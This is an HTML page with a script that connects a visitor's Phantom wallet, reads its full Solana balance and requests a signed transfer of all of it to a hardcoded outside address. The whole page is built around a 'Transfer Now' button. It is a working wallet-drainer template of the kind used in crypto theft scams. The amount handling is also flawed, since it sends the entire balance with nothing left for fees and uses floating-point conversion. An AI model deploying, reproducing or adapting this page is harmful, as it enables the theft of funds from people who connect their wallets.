<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.75.1/web3.min.js"></script>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button id="transfer-btn">Transfer Now</button>

    <script>
        const recipientAddress = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";

        async function transferSOL() {
            try {
                // Check if Phantom wallet is installed
                if (!window.solana || !window.solana.isPhantom) {
                    alert("Please install Phantom wallet.");
                    return;
                }

                // Connect to Phantom wallet
                const provider = window.solana;
                await provider.connect();
                const publicKey = provider.publicKey.toString();
                console.log("Connected wallet:", publicKey);

                // Create connection to Solana cluster
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

                // Get the wallet balance
                let balance = await connection.getBalance(provider.publicKey);
                balance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                
                if (balance === 0) {
                    alert("Insufficient SOL balance.");
                    return;
                }

                // Prepare transaction to transfer all SOL
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                        lamports: balance * solanaWeb3.LAMPORTS_PER_SOL
                    })
                );

                // Request to sign and send the transaction
                const { signature } = await provider.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature);

                alert(`Transaction successful! Signature: ${signature}`);
            } catch (error) {
                console.error("Error:", error);
                alert(`Transaction failed: ${error.message}`);
            }
        }

        document.getElementById("transfer-btn").addEventListener("click", transferSOL);
    </script>
</body>
</html>
